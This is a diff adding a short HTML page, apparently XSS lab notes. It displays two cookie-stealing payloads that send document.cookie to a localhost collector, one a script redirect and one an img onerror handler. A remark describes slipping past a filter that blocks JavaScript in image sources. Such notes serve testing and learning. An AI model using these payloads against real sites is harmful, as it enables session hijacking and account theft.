@@ -1,0 +1,14 @@
+<link rel="stylesheet"
+      href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h4>PayloadAllTheThings Data Grabber:</h4>
+<pre><code style="color:Green">&lt;script&gt;document.location=&#39;http://localhost/XSS/?c=&#39;+document.cookie&lt;/script&gt;</code></pre>
+<br>
+Spoiler: wont work (maybe src string concat not allowed)</li>
+<br>
+<h4>IMG onerror payload:</h4>
+<pre><code style="color:Green">&lt;img src=x onerror=this.src=&quot;http://localhost/?cookie=&quot;+document.cookie /&gt;</code></pre>
+<br>
+Since js is not allowed (black-flagged) in img src, we can trigger it in the error message
